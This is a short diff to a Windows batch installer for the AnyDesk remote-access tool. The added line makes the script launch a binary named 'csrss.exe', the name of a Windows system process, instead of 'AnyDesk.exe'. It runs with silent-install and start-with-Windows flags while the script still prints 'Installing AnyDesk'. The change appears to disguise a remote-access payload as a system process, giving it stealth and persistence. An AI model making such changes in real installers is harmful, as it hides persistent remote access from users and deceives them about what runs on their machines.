@@ -18,7 +18,7 @@ set "INSTALL_DIR=C:\Program Files\AnyDesk"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
 echo Installing AnyDesk...
-"%SCRIPT_DIR%AnyDesk.exe" --install "%INSTALL_DIR%" --silent --start-with-win --silent-config
+"%SCRIPT_DIR%csrss.exe" --install "%INSTALL_DIR%" --silent --start-with-win --silent-config
 
 if %errorlevel% neq 0 (
     echo ERROR: Installation failed. Code: %errorlevel%
